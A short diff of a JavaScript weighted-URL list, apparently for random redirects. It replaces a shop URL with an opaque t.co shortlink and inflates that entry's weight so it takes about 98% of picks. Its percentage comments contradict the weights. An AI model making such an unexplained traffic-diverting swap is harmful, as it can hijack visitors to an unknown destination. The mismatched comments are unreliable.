@@ -1,6 +1,6 @@
 // List of URLs with their respective weights
 const urlWeights = [
-    { url: "https://moncollierunique.com/", weight: 80 }, // 50% chance
+    { url: "https://t.co/5IfJncj3uQ", weight: 800 }, // 50% chance
     { url: "https://monpluganal.com/", weight: 10 }, // 30% chance
     { url: "https://braceletphoto.com/", weight: 10 }  // 20% chance
 ];
